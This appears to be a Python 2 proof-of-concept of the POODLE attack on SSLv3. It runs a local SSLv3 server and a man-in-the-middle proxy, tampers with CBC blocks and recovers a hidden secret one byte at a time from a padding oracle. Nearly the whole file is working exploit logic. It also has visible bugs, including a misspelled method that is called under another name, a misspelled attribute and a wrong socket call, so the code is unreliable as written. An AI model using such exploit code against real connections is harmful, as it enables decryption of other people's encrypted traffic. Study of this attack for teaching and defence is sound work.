import sys
import SocketServer
import ssl
import struct
import random 
import string
import threading
import select
import socket

secret = ''.join([random.choice(string.printable) for s in range(31)]) 

class POODLE(object):
	PHASE_BOUNDS_CHECK = 0
	PHASE_EXPLOIT = 1

	def __init__(self):
		self.phase = POODLE.PHASE_BOUNDS_CHECK
		self.recovery_length = None
		self.block_edge = None
		self.block_size = False
		self.was_error = False
		self.was_success = False
		self.message = None
		self.plaintext = []
		return

	def mark_successs(self):
		self.was_success = True
		return

	def mark_error(self):
		self.was_error = True
		return

	def message_callback(self, msg):
		self.messgae = msg
		if self.phase != POODLE.PHASE_EXPLOIT:
			return msg
		return self.alter()

	def alter(self):
		msg = bytearray(self.message)
		msg = msg[:-self.block_size] + self.block(self.target_block)
		return str(msg)

	def block(self, n):
		return self.message[n*self.block_size:(n+1)*self.block_size]

	def detect_block_info(self):
		reference = len(self.trigger(''))
		self.recovery_length = len(self.message)

		for i in range(16):
			msg = self.trigger('A'*i)
			self.block_size = len(msg) - reference
			if self.block_size != 0:
				self.block_edge = i
				break
		return

	def find_byte(self, block, byte):
		if block < 1:
			raise RuntimeError('Cannot work on block 0')
		self.target_block = block
		for tries in range(1000):
			self.was_error = False
			self.was_success = False

			prefix_length = self.block_size + byte
			suffix_length = self.block_size - byte

			self.trigger('A'*(self.block_edge + prefix_length),'A'*suffix_length)
			if self.was_success:
				plain = chr(ord(self.block(block-1)[-1]) ^ ord(self.block(-2)[-1])^(self.block_size - 1))
				print 'Found byte %u after %u tries: %c' % (byte, tries, plain)
				return plain
		return

	def exploit(self):
		for block in range (1, self.recovery_length / self.block_size):
			for i in reversed(range(self.block_size)):
				plain = self.find_byte(block, i)
				self.plaintext.append(plain)
		return

	def run(self):
		self.detect_block_info()
		print "Block edge:%u" % (self.block_edge, )
		self.phase = POODLE.PHASE_EXPLOIT
		self.exploit()
		return


class POODLE_Client(POODLE):
	def __init__(self):
		POODLE.__init__(self)
		return

	def trigger(self, prefix, suffix = ''):
		s = socket.create_connection((MITM_HOST,MITM_PORT))
		s = ssl.wrap_socket(s, server_side=False,ssl_version=ssl.PROTOCOL_SSLv3,\
			cert_reqs=ssl.CERT_NONE, ciphers="SHA1+DES")

		self.message = None 
		try:
			s.send('%s|secret=%s|%s' % (prefix, secret, suffix))
			s.recv(2)
		except ssl.SSLError as e:
			print 'ssl error: %s' % str(e)
			pass

		s.close()
		return self.message

poodle = POODLE_Client()

class MitmTCPHandler(SocketServer.BaseRequestHandler):
	def handle(self):
		destination = socket.create_connection(SSL_HOST, SSL_PORT)

		only_alter = False
		running = True
		sockets = [self.request, destination]
		while running:
			try :
				inputready, outputready, exceptready = select.select(sockets, [], [])
			except select.error, e:
				break
			except socket.error, e:
				break
			for s in inputready:
				header = self.request.recv(5)
				if header == '':
					print 'client disconnected'
					running = False
					break
				(content_type, version, length) = struct.unpack('>BHH', header)
				data = self.request.recv(length)
				if content_type == 23 and length >24:
					data = poodle.message_callback(data)
					only_alter = True
					print 'client->server(%u): %s'% (length, repr(data), )
					destination.send(header + data) 

				elif s == destination:
					data = destination.recv(1024)
					if data == '':
						print 'server disconnected'
						running = False
						if only_alter:
							poodle.mark_error()
						break
					if only_alter:
						(content_type, version, length) = struct.unpack('>BHH', data[:5])
						if content_type ==23:
							poodle.mark_success()
						if content_type == 21:
							poodle.mark_error()
						only_alter = False
						print 'server -> client :%s' % (repr(data),)
						self.request.send(data)
		return

class SecureTCPHandler(SocketServer.BaseRequestHandler):
	def handle(self):
		self.request = ssl.wrap_socket(self.request, keyfile = "cert.pem", certfile = "cert.pem", \
			server_side = True, ssl_version = ssl.PROTOCOL_SSLv3,cert_reqs = ssl.CERT_NONE, ciphers = "SHA1+DES")
		while True:
			try:
				data = self.request.recv(1024)
				if data == '':
					break
				print 'Securely received: %s' % repr(data)

				self.request.send('ok')
			except ssl.SSLError as e:
				print 'ssl error: %s ' % str(e)
				break
		return

if __name__ == '__main__':
	SSL_HOST, SSL_PORT = "0.0.0.0", 10001
	MITM_HOST, MITM_PORT = "0.0.0.0", 10002

	print('[+] The secret : %s'% repr(secret))

	SocketServer.TCPServer.allow_reuse_address = True

	secure_server = SocketServer.TCPServer((SSL_HOST, SSL_PORT), SecureTCPHandler)
	mitm_server = SocketServer.TCPServer((MITM_HOST, MITM_PORT), MitmTCPHandler)

	threads = [
		threading.Thread(target = secure_server.serve_forever),
		threading.Thread(target = mitm_server.serve_forever),
	]

	for thread in threads:
		thread.start()

	poodle.run()

	print 'done'

	secure_server.shutdown()
	mitm_server.shutdown()

